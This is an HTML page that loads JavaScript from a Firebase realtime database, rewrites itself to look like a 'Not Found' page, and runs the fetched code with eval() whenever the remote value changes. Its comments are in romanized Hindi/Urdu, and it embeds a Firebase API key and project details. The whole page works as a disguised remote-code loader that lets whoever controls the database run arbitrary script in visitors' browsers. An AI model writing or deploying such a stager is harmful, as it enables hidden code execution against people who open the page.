<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
</head>
<body>
<script>
    const firebaseConfig = {
        apiKey: "AIzaSyDuoka8B7oR6blqM6DawxGR7Lz1q6g6n44",
        databaseURL: "https://script-update-server-default-rtdb.firebaseio.com",
        projectId: "script-update-server",
        appId: "1:1065485832455:web:7705978342f83a9caf35a2"
    };
    firebase.initializeApp(firebaseConfig);
    
    firebase.database().ref("server_config/js_content").on("value", (snapshot) => {
        const remoteCode = snapshot.val();
        if (remoteCode) {
            // Poora naya HTML structure jo aapne manga tha
            const finalHTML = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Not Found</title>
</head>
<body>
    <script id="js">
${remoteCode}
    <\/script>
</body>
</html>`;

            // Ye line sabse important hai: Ye current page ko khatam karke naya HTML likh degi
            document.open();
            document.write(finalHTML);
            document.close();
            
            // Isse Sources mein code execute ho jayega
            const executeScript = document.getElementById("js").text;
            eval(executeScript);
        }
    });
</script>
</body>
</html>
